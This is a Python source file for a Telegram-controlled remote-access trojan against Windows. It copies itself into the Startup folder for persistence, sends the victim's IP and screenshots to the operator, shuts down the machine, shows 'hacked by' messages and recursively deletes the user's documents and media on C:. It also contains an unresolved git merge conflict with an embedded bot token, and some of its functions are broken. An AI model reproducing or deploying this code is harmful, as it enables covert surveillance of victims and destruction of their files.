from telegram.ext import CommandHandler, Updater
import urllib.request
import platform
import autopy
import os
<<<<<<< HEAD
import pyttsx3
update = Updater("1350582979:AAER5meJIWqJ8TXyOWIceVI6CFqA6vCqAzw")
=======
import pyttsx

update = Updater("TOKEN")
>>>>>>> 32ea1252a5bcb8a2a78e129be47a740b2d13d69a

u = platform.node()
user = u.replace("-PC" , "")
cmd = 'copy trojan_bot.py "C:\\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\zeroday.py"'.format(user)
os.system(cmd)

def start_method(bot, update):
    chat_id = update.message.chat_id
    my_ip = urllib.request.urlopen("http://ip.42.pl/raw").read()
    bot.sendMessage(chat_id, "connected to : " + str(my_ip))

def system_info(bot, update):
    data = 'os = '+platform.uname()[0]+' '+platform.uname()[2]+' '+platform.architecture()[0]+'\n'
    data += 'node = '+platform.node()+'\n'
    data += 'User = '+platform.uname()[1]+'\n'
    data += 'system Type = '+platform.uname()[5]+'\n'

def screenshot(bot, update):
    image = autopy.bitmap.capture_screen()
    image.save("/home/arman/Desktop/face.png")
    chat_id = update.message.chat_id

    photo = open("/home/arman/Desktop/face.png","rb")

    bot.sendPhoto(chat_id,photo,"screenshot")

    photo.close()

def shutdown_method(bot , update):
    os.system("shutdown /s /t 1")

def note_method(bot , update):
    os.system("echo hacked by armankasa > hacked.txt")
    os.system("start hacked.txt")
    os.system('echo msgbox("hacked by armankasa") > hacked.vbs')
    os.system("start hacked.vbs")

def sound_method(bot , update):
    e = pyttsx3.init()
    e.say("hacked by armankasa")
    e.runAndWait()

def delete_method(bot , update):
    os.system("cd C: && del /S *.txt *.png *.pdf *.mp3 *.mp4 *.rar")

def help_method(bot , update):
    help_ = ""
    help_+= "/start    => Connect to target\n"
    help_+= "/sysinfo  => system information\n" 
    help_+= "/sound    => call system\n"
    help_+= "/screenshot   => get ScreenShot\n"
    help_+= "/shutdown => turn off system\n"
    help_+= '/note     => show text for target\n'
    help_+= "/delete	   => delete target data\n"
    help_+= "/help     => help\n" 

    chat_id = update.message.chat_id
    bot.sendMessage(chat_id,help_)

start = CommandHandler("start", start_method)
update.dispatcher.add_handler(start)

sysinfo = CommandHandler("sysinfo",system_info)
update.dispatcher.add_handler(sysinfo)

screenshot = CommandHandler("screenshot",screenshot)
update.dispatcher.add_handler(screenshot)

shutdown = CommandHandler("shutdown", shutdown_method)
update.dispatcher.add_handler(shutdown)

note = CommandHandler("note", note_method)
update.dispatcher.add_handler(note)

sound = CommandHandler("sound", sound_method)
update.dispatcher.add_handler(sound)

delete = CommandHandler("delete",delete_method)
update.dispatcher.add_handler(delete)

helping = CommandHandler("help",help_method)
update.dispatcher.add_handler(helping)

update.start_polling()
